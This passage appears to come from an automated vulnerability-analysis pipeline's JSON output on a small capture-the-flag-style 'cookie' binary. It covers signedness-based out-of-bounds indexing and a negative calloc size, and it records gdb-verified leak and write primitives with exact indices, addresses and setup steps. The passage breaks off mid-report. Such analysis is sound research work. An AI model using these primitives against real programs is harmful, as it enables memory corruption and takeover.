 start of msg_size. msg[32] (OOB index 32) reads from 0x4160 = first element of msg_size array.\",\"source\":\"ELF\"},{\"id\":\"F014\",\"type\":\"DERIVED\",\"description\":\"scanf %llu stores unsigned 64-bit value; JL compares as signed. Values with bit 63 set (>= 0x8000000000000000) are negative as signed and will pass idx < cookie_num (which is small positive), enabling negative/OOB array indexing.\",\"source\":\"DISASSEMBLY\"}],\"uncertainties\":[{\"id\":\"U001\",\"description\":\"Whether OOB index in edit_cookie/read_cookie can reach useful targets (e.g., msg_size elements, urandom, cookie_num, or other BSS objects) for S2 to analyze\",\"reason\":\"Derived from layout: msg[-N] / msg[+OOB] addresses need S2 to compute exact reachable targets and assess exploitability\"},{\"id\":\"U002\",\"description\":\"Whether eat_cookie's swap-with-last without nulling creates a exploitable UAF/double-free primitive\",\"reason\":\"S2 needs to analyze the exact allocation/free sequence and whether the dangling pointer at msg[cookie_num-1] can be reused\"},{\"id\":\"U003\",\"description\":\"Runtime heap layout and tcache behavior under glibc 2.39\",\"reason\":\"S2/S3 need dynamic analysis to determine heap chunk placement and free-list behavior\"},{\"id\":\"U004\",\"description\":\"Whether msg_size[index]-1 can underflow when msg_size[index]==0 (OOB case reading 0 from adjacent memory)\",\"reason\":\"sub eax,0x1 on 0 gives -1, movsxd gives 0xFFFFFFFFFFFFFFFF as read size — S2 should analyze this path\"}],\"raw\":{\"elf\":\"ELF64 LSB PIE, x86-64, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, not stripped, BuildID=84dab319bf6fe22134cf0338cbd8071fd8bc06c2, GCC 10.2.0 (Debian)\",\"sections\":\".text@0x1110 RX 0x891 | .rodata@0x2000 R 0x266 | .data@0x4000 RW 0x10 | .bss@0x4020 RW 0x1d0 | .got@0x3f58 RW 0xa8 | .plt@0x1020 RX 0xe0 | .init_array@0x3d58 RW 8 | .fini_array@0x3d60 RW 8\",\"symbols\":\"main@0x187f | init@0x1232 | create_cookie@0x1399 | eat_cookie@0x14e1 | edit_cookie@0x1628 | read_cookie@0x1751 | menu@0x17fd | _abort@0x11f5 | msg@0x4060(256B) | msg_size@0x4160(128B) | cookie_num@0x41e8(8B) | urandom@0x41e0(8B)\",\"disassembly\":\"edit_cookie: scanf(%llu)->idx; cmp rdx,cookie_num; jl ok; (no lower bound); read(0,msg[idx],msg_size[idx]-1). read_cookie: same idx check; printf(%s,msg[idx]). eat_cookie: rand=fread(urandom)%cookie_num; free(msg[rand]); msg[rand]=msg[cookie_num-1]; msg_size[rand]=msg_size[cookie_num-1]; cookie_num--; (msg[cookie_num-1] not zeroed). create_cookie: if(cookie_num>0x1f)abort; scanf(%lld)->size; if(size>0x100)abort; calloc(size,1); read(0,buf,size); msg[cookie_num]=buf; msg_size[cookie_num]=size; cookie_num++.\"}},\"vulnerability_report\":{\"schema\":\"VulnerabilityReport\",\"version\":\"1.0\",\"status\":\"COMPLETED\",\"summary\":{\"total_bugs\":2,\"high_severity\":1,\"medium_severity\":1,\"low_severity\":0},\"vulnerabilities\":[{\"bug_id\":\"BUG-001\",\"title\":\"INDEX_SIGNEDNESS_MISMATCH_IN_EDIT_AND_READ_COOKIE\",\"root_cause\":{\"type\":\"Signedness Error\",\"description\":\"edit_cookie and read_cookie read an index via scanf(\\\"%llu\\\") (unsigned 64-bit) but validate it with a signed comparison (cmp rdx,cookie_num; jl). Values with bit 63 set (>= 0x8000000000000000) are interpreted as negative by JL and pass the 'index < cookie_num' check, bypassing the lower bound entirely. No explicit lower-bound check (index >= 0) exists. This allows out-of-bounds access to the global msg[32] and msg_size[32] arrays, reaching adjacent BSS data including stdout/stdin/stderr FILE* pointers (negative indices), msg_size elements, urandom FILE*, and cookie_num (positive OOB indices).\"},\"affected_functions\":[\"edit_cookie\",\"read_cookie\"],\"affected_objects\":[\"msg[32] @ 0x4060 (char* array, 256 bytes)\",\"msg_size[32] @ 0x4160 (int32 array, 128 bytes)\",\"stdout @ 0x4020 (FILE*)\",\"stdin @ 0x4030 (FILE*)\",\"stderr @ 0x4040 (FILE*)\",\"urandom @ 0x41e0 (FILE*)\",\"cookie_num @ 0x41e8 (int64)\"],\"attack_surface\":{\"input\":\"cookie_index via scanf(\\\"%llu\\\") — unsigned 64-bit integer from stdin\",\"entry_function\":\"main (menu choice 3=edit_cookie, 4=read_cookie)\",\"data_flow\":[\"Attacker provides index via scanf(\\\"%llu\\\") → stored as uint64 at [rbp-0x10]\",\"cmp rdx,cookie_num; jl — signed comparison, negative values pass\",\"edit_cookie: msg_size[index] read (OOB if negative/large) → sub eax,0x1 → movsxd rdx,eax (sign-extend to 64-bit) → read length\",\"edit_cookie: msg[index] read (OOB pointer from BSS) → used as buffer address for read(0, msg[index], msg_size[index]-1)\",\"read_cookie: msg[index] read (OOB pointer from BSS) → printf(\\\"%s\\\", msg[index]) dereferences OOB pointer as string\"]},\"security_check\":{\"expected\":\"Index should be validated as unsigned: 0 <= index < cookie_num, using unsigned comparison (jb/jae) or explicit lower-bound check\",\"actual\":\"Only 'cmp rdx,cookie_num; jl' (signed less-than) is performed; no lower-bound (>= 0) check exists. JL treats values >= 0x8000000000000000 as negative, so they pass the check.\",\"missing_or_incorrect\":\"Missing lower-bound check (index >= 0) and use of signed JL instead of unsigned JB for upper-bound comparison\"},\"vulnerable_operation\":{\"operation\":\"OOB array read of msg[index] and msg_size[index], then dereference of OOB msg[index] pointer\",\"address\":\"0x16a3-0x16de (edit_cookie: msg_size[index] read at 0x16b6, msg[index] read at 0x16d2, read() call at 0x16de); 0x17bb-0x17e1 (read_cookie: msg[index] read at 0x17ce, printf() call at 0x17e1)\",\"expression\":\"edit_cookie: read(0, msg[index], msg_size[index]-1); read_cookie: printf(\\\"%s\\\", msg[index])\",\"target\":\"msg[index] (OOB pointer from BSS, e.g., FILE* values from stdout/stdin/stderr/urandom) and msg_size[index] (OOB int32 from BSS, e.g., low 4 bytes of urandom/cookie_num)\",\"size\":\"msg_size[index]-1 bytes (edit_cookie); unbounded string (read_cookie printf %s)\"},\"impact\":[{\"type\":\"OOB_READ\",\"status\":\"CANDIDATE\",\"reason\":\"In read_cookie, an OOB index causes msg[index] to read a pointer from adjacent BSS (e.g., stdout/stdin/stderr FILE* at negative indices, or msg_size/urandom/cookie_num values at positive OOB indices). This pointer is then dereferenced by printf(\\\"%s\\\", msg[index]), reading memory at the OOB pointer address as a string. If the OOB-read pointer value corresponds to a readable address, this leaks memory contents to the attacker.\"},{\"type\":\"OOB_WRITE\",\"status\":\"CANDIDATE\",\"reason\":\"In edit_cookie, an OOB index causes msg[index] to read a pointer from adjacent BSS and msg_size[index] to read a size from adjacent BSS. read(0, msg[index], msg_size[index]-1) then writes attacker-controlled stdin data to the address pointed to by the OOB-read pointer value. If the OOB pointer value is a writable address (e.g., a FILE* heap pointer or other valid heap/data pointer), attacker data overwrites memory at that address.\"},{\"type\":\"INFO_LEAK\",\"status\":\"CANDIDATE\",\"reason\":\"In read_cookie, printf(\\\"%s\\\", msg[index]) with an OOB index dereferences an OOB-read pointer as a string, potentially leaking memory contents including heap addresses (FILE* pointers) or other sensitive data to stdout.\"},{\"type\":\"CRASH\",\"status\":\"CANDIDATE\",\"reason\":\"If the OOB-read pointer value from msg[index] is not a valid address, dereferencing it in read() or printf() causes SIGSEGV.\"}],\"evidence\":[{\"id\":\"E001\",\"type\":\"STATIC\",\"function\":\"edit_cookie\",\"address\":\"0x1671\",\"description\":\"scanf(\\\"%llu\\\") reads unsigned 64-bit index into [rbp-0x10]. Format string \\\"%llu\\\" confirmed at .rodata 0x21c4.\"},{\"id\":\"E002\",\"type\":\"STATIC\",\"function\":\"edit_cookie\",\"address\":\"0x1681-0x1684\",\"description\":\"cmp rdx,rax; jl 0x1692 — JL is signed less-than jump. rdx = user index (uint64), rax = cookie_num (small positive). Values >= 0x8000000000000000 are negative as signed and pass JL. No preceding cmp idx,0 / jge lower-bound check exists.\"},{\"id\":\"E003\",\"type\":\"STATIC\",\"function\":\"edit_cookie\",\"address\":\"0x16a3-0x16b6\",\"description\":\"msg_size[index] read: lea rdx,[rax*4+0x0]; lea rax,[rip+0x2aaa] (=0x4160 msg_size); mov eax,[rdx+rax]. With OOB index, this reads from BSS beyond msg_size[31], e.g., urandom (0x41e0) or cookie_num (0x41e8).\"},{\"id\":\"E004\",\"type\":\"STATIC\",\"function\":\"edit_cookie\",\"address\":\"0x16bf-0x16de\",\"description\":\"msg[index] read: lea rcx,[rax*8+0x0]; lea rax,[rip+0x298e] (=0x4060 msg); mov rax,[rcx+rax]; then read(0, rax, rdx). With OOB index, msg[index] reads a pointer from adjacent BSS (e.g., FILE* at negative indices, or msg_size/urandom/cookie_num at positive OOB indices). This OOB-read pointer is passed as the buffer to read().\"},{\"id\":\"E005\",\"type\":\"STATIC\",\"function\":\"read_cookie\",\"address\":\"0x179a-0x17ad\",\"description\":\"scanf(\\\"%llu\\\") then cmp rdx,rax; jl 0x17bb — identical signed comparison pattern as edit_cookie, same signedness mismatch.\"},{\"id\":\"E006\",\"type\":\"STATIC\",\"function\":\"read_cookie\",\"address\":\"0x17bb-0x17e1\",\"description\":\"msg[index] read via lea rdx,[rax*8]; lea rax,[rip+0x2892] (=0x4060 msg); mov rax,[rdx+rax]; then printf(\\\"%s\\\", rax). OOB index dereferences OOB-read pointer as string.\"},{\"id\":\"E007\",\"type\":\"DERIVED\",\"function\":\"edit_cookie/read_cookie\",\"address\":\"N/A\",\"description\":\"BSS layout: msg[32] @ 0x4060 (256B, ends 0x4160); msg_size[32] @ 0x4160 (128B, ends 0x41e0); urandom @ 0x41e0 (8B); cookie_num @ 0x41e8 (8B). stdout @ 0x4020, stdin @ 0x4030, stderr @ 0x4040 are before msg. Negative index (e.g., -4 = 0xFFFFFFFFFFFFFFFC as unsigned) accesses msg[-4] = 0x4060 - 32 = 0x4040 = stderr FILE*. Positive OOB index 32 accesses msg[32] = 0x4160 = first msg_size element.\"}],\"confidence\":\"HIGH\",\"verification_required\":[\"Confirm that OOB-read pointer values (e.g., FILE* heap pointers from stdout/stdin/stderr) are valid dereferenceable addresses at runtime\",\"Verify whether msg_size[index]-1 underflows to 0xFFFFFFFFFFFFFFFF when OOB msg_size read is 0, and how read() handles this size\",\"Determine exact reachable BSS targets for specific negative index values and assess what data can be read/written\"]},{\"bug_id\":\"BUG-002\",\"title\":\"CREATE_COOKIE_NEGATIVE_SIZE_NULL_DEREF\",\"root_cause\":{\"type\":\"Signedness Error\",\"description\":\"create_cookie reads message size via scanf(\\\"%lld\\\") (signed 64-bit) and checks it with 'cmp rax, 0x100; jle' (signed comparison). A negative size value passes this check because any negative number is <= 0x100 in signed comparison. The negative value is then passed to calloc(size, 1) where it is interpreted as a huge unsigned number, causing calloc to fail and return NULL. The code does not check calloc's return value for NULL, then proceeds to use the NULL pointer as a buffer for read() and subsequently dereferences it.\"},\"affected_functions\":[\"create_cookie\"],\"affected_objects\":[\"calloc return value (heap buffer pointer, NULL when allocation fails)\"],\"attack_surface\":{\"input\":\"message_size via scanf(\\\"%lld\\\") — signed 64-bit integer from stdin\",\"entry_function\":\"main (menu choice 2 = create_cookie)\",\"data_flow\":[\"Attacker provides negative size via scanf(\\\"%lld\\\") → stored at [rbp-0x18]\",\"cmp rax, 0x100; jle 0x140a — signed comparison, negative values pass\",\"calloc(rax, 1) at 0x1416 — rax is negative interpreted as huge unsigned → allocation fails → returns NULL\",\"mov [rbp-0x10], rax — stores NULL pointer, no NULL check\",\"read(0, NULL, huge_size) at 0x1443 — read fails (EFAULT), returns -1\",\"movsxd rdx, eax — rdx = 0xFFFFFFFFFFFFFFFF (sign-extended -1)\",\"add rax, rdx — rax = NULL + 0xFFFFFFFFFFFFFFFF = 0xFFFFFFFFFFFFFFFF\",\"movzx eax, [rax] — dereferences 0xFFFFFFFFFFFFFFFF → SIGSEGV\"]},\"security_check\":{\"expected\":\"Size should be validated as unsigned and within valid range (1 <= size <= 256), using unsigned comparison, and calloc return value should be checked for NULL\",\"actual\":\"Signed comparison (jle) allows negative values; no NULL check on calloc return value\",\"missing_or_incorrect\":\"Missing unsigned comparison for size check; missing NULL pointer check on calloc return value\"},\"vulnerable_operation\":{\"operation\":\"NULL pointer dereference after failed calloc\",\"address\":\"0x1458 (movzx eax, [rax] where rax = 0xFFFFFFFFFFFFFFFF)\",\"expression\":\"*(NULL + (int64)read_return_value) — dereferences invalid address\",\"target\":\"Invalid address 0xFFFFFFFFFFFFFFFF (NULL + sign-extended -1)\",\"size\":\"1 byte (movzx)\"},\"impact\":[{\"type\":\"NULL_POINTER_DEREF\",\"status\":\"CANDIDATE\",\"reason\":\"calloc returns NULL for huge (negative-interpreted-as-unsigned) size. The NULL pointer is used without check, leading to dereference of 0xFFFFFFFFFFFFFFFF.\"},{\"type\":\"CRASH\",\"status\":\"CANDIDATE\",\"reason\":\"The dereference of 0xFFFFFFFFFFFFFFFF causes SIGSEGV, crashing the process. This is a denial of service via attacker-controlled input (a single negative size value).\"}],\"evidence\":[{\"id\":\"E008\",\"type\":\"STATIC\",\"function\":\"create_cookie\",\"address\":\"0x13e1-0x13fc\",\"description\":\"scanf(\\\"%lld\\\") reads signed 64-bit size into [rbp-0x18]; then cmp rax, 0x100; jle 0x140a. JLE is signed comparison — negative values pass the check.\"},{\"id\":\"E009\",\"type\":\"STATIC\",\"function\":\"create_cookie\",\"address\":\"0x1416\",\"description\":\"calloc(rdi=rax, rsi=1) — rax is the negative size value interpreted as huge unsigned. calloc fails and returns NULL.\"},{\"id\":\"E010\",\"type\":\"STATIC\",\"function\":\"create_cookie\",\"address\":\"0x141b-0x1443\",\"description\":\"mov [rbp-0x10], rax stores NULL (calloc result) with no NULL check. Then read(0, [rbp-0x10]=NULL, size) is called.\"},{\"id\":\"E011\",\"type\":\"STATIC\",\"function\":\"create_cookie\",\"address\":\"0x1448-0x1458\",\"description\":\"read() returns -1 (stored at [rbp-0x1c]); movsxd rdx,eax sign-extends to 0xFFFFFFFFFFFFFFFF; add rax,rdx where rax=NULL → 0xFFFFFFFFFFFFFFFF; movzx eax,[rax] dereferences invalid address → SIGSEGV.\"}],\"confidence\":\"HIGH\",\"verification_required\":[\"Confirm that calloc with a negative int64 (huge unsigned) returns NULL on glibc 2.39\",\"Verify the exact crash address and whether any partial write occurs before the crash\"]}],\"non_vulnerabilities\":[{\"function\":\"eat_cookie\",\"description\":\"S1 flagged potential UAF/double-free because msg[cookie_num-1] is not zeroed after swap-with-last.\",\"reason\":\"Analysis of eat_cookie disassembly (0x14e1-0x1627) shows: free(msg[random_index]) is called first, then msg[random_index] = msg[cookie_num-1] overwrites the freed pointer with a valid (non-freed) pointer. The pointer at msg[cookie_num-1] is NOT freed — it is a valid pointer that gets copied. After cookie_num--, the old msg[cookie_num-1] slot is now out of range (>= cookie_num) and inaccessible by edit_cookie/read_cookie (which check index < cookie_num). It will be overwritten by the next create_cookie. No dangling freed pointer remains reachable through normal operations. If random_index == cookie_num-1, the freed pointer is self-assigned back to the same slot, but cookie_num-- makes it out of range. No UAF or double-free path exists.\"}],\"unresolved\":[{\"description\":\"Whether the OOB read in edit_cookie can reach a pointer value that points to a writable and useful target (e.g., heap-adjacent to FILE* structures)\",\"reason\":\"The OOB-read pointer from msg[index] depends on runtime BSS values (FILE* pointers, msg_size values reinterpreted as pointers). Static analysis confirms the OOB access exists but cannot determine if the dereferenced pointer values are valid writable addresses at runtime.\",\"required_next_step\":\"S3 dynamic analysis: set specific negative/positive OOB indices and observe what pointer values are read from BSS, then check if read()/printf() successfully dereferences them.\"},{\"description\":\"Whether msg_size[index]-1 underflow (when OOB msg_size read is 0) produces a read() size of 0xFFFFFFFFFFFFFFFF and how the kernel handles it\",\"reason\":\"At 0x16b9, sub eax,0x1 on a 0 value gives 0xFFFFFFFF, then movsxd gives 0xFFFFFFFFFFFFFFFF. The Linux read() syscall rejects sizes > 0x7ffff000 (returns EINVAL), so read() would return -1 without writing. But if msg_size[index] OOB read is a small positive value, the write size would be that value - 1, potentially allowing a small write to the OOB-read pointer address.\",\"required_next_step\":\"S3 dynamic analysis: test specific OOB indices to observe msg_size values read and resulting read() behavior.\"}]},\"primitive_reports\":[{\"schema\":\"PrimitiveReport\",\"version\":\"1.0\",\"stage\":\"S3\",\"target_bug_id\":\"BUG-001\",\"status\":\"COMPLETED\",\"summary\":{\"analyzed_bug_id\":\"BUG-001\",\"total_primitives\":4,\"verified\":4,\"theoretical\":0,\"candidate\":0,\"unknown\":0},\"primitives\":[{\"primitive_id\":\"PRIM-001\",\"type\":\"INFO_LEAK\",\"status\":\"VERIFIED\",\"kind\":\"DIRECT\",\"source\":{\"bug_id\":\"BUG-001\",\"root_cause\":\"Signedness mismatch in read_cookie: scanf(\\\"%llu\\\") reads unsigned 64-bit index, but validation uses signed JL comparison. Values with bit 63 set (>= 0x8000000000000000) are negative as signed and pass the 'index < cookie_num' check, enabling OOB access to msg[] array.\",\"description\":\"read_cookie with index -4 (0xFFFFFFFFFFFFFFFC) reads msg[-4] = stderr FILE* pointer from BSS at 0x4040. printf(\\\"%s\\\", msg[-4]) dereferences the FILE* and prints FILE structure contents as a string, leaking non-attacker data (FILE flags 0xfbad2087) to stdout.\"},\"chain\":[\"BUG-001\",\"Signedness mismatch: scanf %llu + signed JL\",\"OOB index -4 passes JL check (negative < cookie_num)\",\"msg[-4] reads stderr FILE* from BSS @ 0x4040\",\"printf(\\\"%s\\\", stderr_FILE*) leaks FILE struct bytes\",\"INFO_LEAK\"],\"controlled_element\":{\"what\":\"OOB array index selecting which BSS pointer to dereference\",\"how\":\"Attacker provides index via scanf(\\\"%llu\\\"); values >= 0x8000000000000000 are negative as signed and pass JL check\",\"reach_sensitive_operation\":true},\"preconditions\":[{\"id\":\"PC-01\",\"description\":\"Index value with bit 63 set (e.g., 0xFFFFFFFFFFFFFFFC = -4) to pass signed JL comparison against cookie_num\",\"necessity\":\"Required to bypass the upper-bound check and access negative indices\",\"verified\":true},{\"id\":\"PC-02\",\"description\":\"msg[-4] at BSS 0x4040 must contain a valid readable pointer (stderr FILE* = libc _IO_2_1_stderr_ address)\",\"necessity\":\"Required for printf to dereference and print data without crashing\",\"verified\":true},{\"id\":\"PC-03\",\"description\":\"The FILE structure at the dereferenced address must contain non-zero bytes before the first NULL byte to produce output\",\"necessity\":\"printf(\\\"%s\\\") stops at first NULL; FILE flags 0xfbad2087 has 4 non-zero bytes before NULL padding at offset 4\",\"verified\":true}],\"alias_key_findings\":[{\"expression\":\"msg[-4] = *(0x4060 + (-4)*8) = *(0x4040) = stderr FILE*\",\"alias\":\"BSS slot at 0x4040 holds stderr FILE* pointer (libc _IO_2_1_stderr_ address)\",\"implication\":\"OOB read of msg[-4] yields a valid libc pointer; dereferencing it via printf leaks FILE structure contents\"}],\"verification_plan\":{\"method\":\"Run read_cookie with index -4 (0xFFFFFFFFFFFFFFFC); observe leaked bytes in program output\",\"environment\":\"Linux x86_64, glibc 2.39, PIE binary\",\"run_command\":\"cd /work/test && python3 poc-BUG-001.py\",\"expected_evidence\":[\"Program output contains bytes 87 20 ad fb (stderr FILE flags 0xfbad2087 in LE)\",\"Leaked data is non-attacker-provided (FILE structure internal flags)\"]},\"mitigations\":[{\"name\":\"PIE\",\"present\":true,\"primitive_impact\":\"PIE randomizes binary base address but does not prevent OOB access to BSS globals relative to msg[] base; the OOB index calculation is relative to msg[] and works regardless of PIE base\"},{\"name\":\"Full RELRO\",\"present\":true,\"primitive_impact\":\"Full RELRO makes GOT read-only but does not affect BSS data reads; FILE* pointers in BSS are still readable\"},{\"name\":\"NX\",\"present\":true,\"primitive_impact\":\"NX prevents code execution but does not affect info leak via printf\"}],\"evidence\":[{\"id\":\"E001\",\"type\":\"STATIC\",\"function\":\"read_cookie\",\"address\":\"0x17a3-0x17ad\",\"description\":\"scanf(\\\"%llu\\\") reads unsigned 64-bit index; cmp rdx,cookie_num; jl uses signed comparison. No lower-bound check. Values >= 0x8000000000000000 pass as negative.\"},{\"id\":\"E002\",\"type\":\"STATIC\",\"function\":\"read_cookie\",\"address\":\"0x17bb-0x17e1\",\"description\":\"msg[index] read via lea rdx,[rax*8]; lea rax,[rip+0x2892] (=0x4060 msg); mov rax,[rdx+rax]; then printf(\\\"%s\\\", rax). OOB index dereferences OOB-read pointer as string.\"},{\"id\":\"E003\",\"type\":\"DYNAMIC\",\"function\":\"read_cookie\",\"address\":\"0x17e1\",\"description\":\"gdb breakpoint at printf call: rsi = 0x7ffff7fa74e0 = _IO_2_1_stderr_ (stderr FILE struct). printf(\\\"%s\\\", rsi) outputs bytes 87 20 ad fb (FILE flags 0xfbad2087 LE). Program continues normally after leak.\"},{\"id\":\"E004\",\"type\":\"DYNAMIC\",\"function\":\"read_cookie\",\"address\":\"0x17e1\",\"description\":\"PoC output: Leaked bytes (hex): 8720adfb, 4 bytes. Matches expected stderr FILE flags 0xfbad2087.\"}],\"verification_result\":{\"executed\":true,\"poc_path\":\"/work/test/poc-BUG-001.py\",\"written_value\":\"\",\"read_value\":\"0xfbad2087 (stderr FILE flags, leaked as bytes 87 20 ad fb)\",\"fault_address\":\"\",\"return_code\":0,\"details\":\"read_cookie(-4) via printf(\\\"%s\\\", msg[-4]) leaked 4 bytes of stderr FILE structure (flags 0xfbad2087). gdb confirmed rsi=0x7ffff7fa74e0=_IO_2_1_stderr_ at printf call. PoC output: 'Leaked bytes (hex): 8720adfb'.\"},\"confidence\":\"HIGH\",\"notes\":\"INFO_LEAK leaks FILE flags (4 bytes) but not pointers directly, because FILE struct has NULL padding at offset 4. The flags value 0xfbad2087 is non-attacker data from process memory, confirming the leak. This primitive also works for stdout (-8) and stdin (-6) FILE structures.\"},{\"primitive_id\":\"PRIM-002\",\"type\":\"INFO_LEAK\",\"status\":\"VERIFIED\",\"kind\":\"DIRECT\",\"source\":{\"bug_id\":\"BUG-001\",\"root_cause\":\"Same signedness mismatch as PRIM-001, applied to stdout FILE* via index -8\",\"description\":\"read_cookie with index -8 (0xFFFFFFFFFFFFFFF8) reads msg[-8] = stdout FILE* pointer from BSS at 0x4020. printf(\\\"%s\\\", msg[-8]) dereferences the FILE* and prints FILE structure contents, leaking stdout FILE flags (0xfbad2887).\"},\"chain\":[\"BUG-001\",\"Signedness mismatch: scanf %llu + signed JL\",\"OOB index -8 passes JL check (negative < cookie_num)\",\"msg[-8] reads stdout FILE* from BSS @ 0x4020\",\"printf(\\\"%s\\\", stdout_FILE*) leaks FILE struct bytes\",\"INFO_LEAK\"],\"controlled_element\":{\"what\":\"OOB array index selecting which BSS pointer to dereference\",\"how\":\"Attacker provides index -8 (0xFFFFFFFFFFFFFFF8) via scanf(\\\"%llu\\\")\",\"reach_sensitive_operation\":true},\"preconditions\":[{\"id\":\"PC-01\",\"description\":\"Index value with bit 63 set (e.g., 0xFFFFFFFFFFFFFFF8 = -8) to pass signed JL comparison\",\"necessity\":\"Required to bypass upper-bound check and access negative indices\",\"verified\":true},{\"id\":\"PC-02\",\"description\":\"msg[-8] at BSS 0x4020 must contain stdout FILE* (valid readable libc pointer)\",\"necessity\":\"Required for printf to dereference and print data\",\"verified\":true}],\"alias_key_findings\":[{\"expression\":\"msg[-8] = *(0x4060 + (-8)*8) = *(0x4020) = stdout FILE*\",\"alias\":\"BSS slot at 0x4020 holds stdout FILE* pointer (libc _IO_2_1_stdout_ address)\",\"implication\":\"OOB read yields valid libc pointer; dereference via printf leaks stdout FILE structure flags\"}],\"verification_plan\":{\"method\":\"Run read_cookie with index -8 (0xFFFFFFFFFFFFFFF8); observe leaked bytes\",\"environment\":\"Linux x86_64, glibc 2.39, PIE binary\",\"run_command\":\"cd /work/test && python3 poc-BUG-001.py\",\"expected_evidence\":[\"Program output contains bytes 87 28 ad fb (stdout FILE flags 0xfbad2887 in LE)\"]},\"mitigations\":[{\"name\":\"PIE\",\"present\":true,\"primitive_impact\":\"PIE does not prevent relative OOB access to BSS globals\"},{\"name\":\"Full RELRO\",\"present\":true,\"primitive_impact\":\"Does not affect BSS data reads\"},{\"name\":\"NX\",\"present\":true,\"primitive_impact\":\"Does not affect info leak\"}],\"evidence\":[{\"id\":\"E005\",\"type\":\"STATIC\",\"function\":\"read_cookie\",\"address\":\"0x17bb-0x17e1\",\"description\":\"Same OOB msg[index] read + printf(\\\"%s\\\") pattern as PRIM-001, with index -8 accessing stdout FILE* at BSS 0x4020\"},{\"id\":\"E006\",\"type\":\"DYNAMIC\",\"function\":\"read_cookie\",\"address\":\"0x17e1\",\"description\":\"gdb: rsi = 0x7ffff7fa75c0 = _IO_2_1_stdout_. printf outputs bytes 87 28 ad fb (stdout FILE flags 0xfbad2887 LE).\"},{\"id\":\"E007\",\"type\":\"DYNAMIC\",\"function\":\"read_cookie\",\"address\":\"0x17e1\",\"description\":\"PoC output: Leaked bytes (hex): 8728adfb, 4 bytes. Matches expected stdout FILE flags 0xfbad2887.\"}],\"verification_result\":{\"executed\":true,\"poc_path\":\"/work/test/poc-BUG-001.py\",\"written_value\":\"\",\"read_value\":\"0xfbad2887 (stdout FILE flags, leaked as bytes 87 28 ad fb)\",\"fault_address\":\"\",\"return_code\":0,\"details\":\"read_cookie(-8) leaked 4 bytes of stdout FILE structure (flags 0xfbad2887). gdb confirmed rsi=0x7ffff7fa75c0=_IO_2_1_stdout_ at printf call. PoC: 'Leaked bytes (hex): 8728adfb'.\"},\"confidence\":\"HIGH\",\"notes\":\"Confirms INFO_LEAK works for multiple FILE structures (stderr, stdout, stdin). The leaked flags differ between FILE structures (0xfbad2087 vs 0xfbad2887), proving distinct memory regions are being read.\"},{\"primitive_id\":\"PRIM-003\",\"type\":\"RELATIVE_WRITE\",\"status\":\"VERIFIED\",\"kind\":\"INDIRECT\",\"source\":{\"bug_id\":\"BUG-001\",\"root_cause\":\"Same signedness mismatch in edit_cookie. OOB index -11 accesses __dso_handle (self-referencing pointer in .data). msg_size[-11] aliases high 4 bytes of msg[26], which after filling msg[26] via create_cookie becomes 0x00005555 (small positive = 21845), giving a valid read size of 21844.\",\"description\":\"edit_cookie with index -11 (0xFFFFFFFFFFFFFFF5) reads msg[-11] = __dso_handle (self-referencing pointer at .data 0x4008, value == &value). msg_size[-11] = high 4 bytes of msg[26] = 0x00005555 after filling msg[26]. read(0, __dso_handle, 21844) writes attacker-controlled stdin data to __dso_handle address (fixed target in .data).\"},\"chain\":[\"BUG-001\",\"Signedness mismatch: scanf %llu + signed JL\",\"OOB index -11 passes JL check\",\"msg[-11] = __dso_handle (self-ref ptr at .data 0x4008)\",\"msg_size[-11] = high 4 bytes of msg[26] = 0x00005555 (after 22 create_cookie calls)\",\"read(0, __dso_handle, 21844) writes attacker data to fixed .data address\",\"RELATIVE_WRITE\"],\"controlled_element\":{\"what\":\"Write value (attacker-controlled stdin data) and write target (fixed: __dso_handle at PIE+0x4008)\",\"how\":\"Attacker sends data via stdin to read(0, __dso_handle, 21844); target is fixed but value is controlled\",\"reach_sensitive_operation\":true},\"preconditions\":[{\"id\":\"PC-01\",\"description\":\"Index -11 (0xFFFFFFFFFFFFFFF5) must pass signed JL check (negative < cookie_num)\",\"necessity\":\"Required to bypass upper-bound check\",\"verified\":true},{\"id\":\"PC-02\",\"description\":\"msg[26] must be filled with a heap pointer so that msg_size[-11] (high 4 bytes of msg[26]) = 0x00005555 (small positive). Requires 22 create_cookie calls (msg[5..26]).\",\"necessity\":\"Without filling msg[26], msg_size[-11] = 0, which underflows to -1 (0xFFFFFFFFFFFFFFFF), causing read() to return EINVAL without writing.\",\"verified\":true},{\"id\":\"PC-03\",\"description\":\"msg[-11] = __dso_handle must be a valid writable address (self-referencing pointer in .data segment)\",\"necessity\":\"read() target buffer must be writable for the write to succeed\",\"verified\":true},{\"id\":\"PC-04\",\"description\":\"read() size (21844) must not cause EFAULT: target + size must be within writable memory. __dso_handle is in .data (RW), and .data + .bss spans enough writable memory.\",\"necessity\":\"If target + size exceeds writable region, read() returns EFAULT without writing\",\"verified\":true}],\"alias_key_findings\":[{\"expression\":\"msg[-11] = *(0x4060 + (-11)*8) = *(0x4008) = __dso_handle\",\"alias\":\"__dso_handle is a self-referencing pointer: its value equals its own address (value == &value). This is the key enabler for two-step write (PRIM-004).\",\"implication\":\"Writing to *msg[-11] = *(__dso_handle) modifies __dso_handle itself, which is also msg[-11]. Next use of same index reads the modified value as the write target.\"},{\"expression\":\"msg_size[-11] = *(int32*)(0x4160 + (-11)*4) = *(int32*)(0x8134) = high 4 bytes of msg[26]\",\"alias\":\"msg_size[-11] aliases the high 4 bytes of msg[26] (8-byte pointer). Heap pointers have form 0x0000XXXX_XXXXXXXX; high 4 bytes = 0x0000XXXX (small positive).\",\"implication\":\"After filling msg[26] with a heap pointer, msg_size[-11] becomes a small positive value (0x00005555 = 21845), giving read size = 21844. This is the critical alias that makes the write feasible.\"}],\"verification_plan\":{\"method\":\"1. Create 22 cookies to fill msg[5..26]. 2. Run edit_cookie with index -11. 3. Send 8 bytes of 0x41. 4. Observe crash at 0x4141414141414149 (post-read deref of modified __dso_handle).\",\"environment\":\"Linux x86_64, glibc 2.39, PIE binary\",\"run_command\":\"cd /work/test && python3 poc-BUG-001.py\",\"expected_evidence\":[\"__dso_handle value changes from self-referencing to 0x4141414141414141\",\"Program crashes with SIGSEGV at 0x4141414141414149 (modified __dso_handle + 8)\"]},\"mitigations\":[{\"name\":\"PIE\",\"present\":true,\"primitive_impact\":\"PIE randomizes __dso_handle address but does not prevent the write; the OOB index is relative to msg[] base and works regardless of PIE base. PIE base can be leaked via read_cookie(-11) for address calculation.\"},{\"name\":\"Full RELRO\",\"present\":true,\"primitive_impact\":\"Full RELRO makes GOT read-only, but __dso_handle is in .data (not GOT) and remains writable.\"},{\"name\":\"Canary\",\"present\":true,\"primitive_impact\":\"Canary protects stack but the write targets 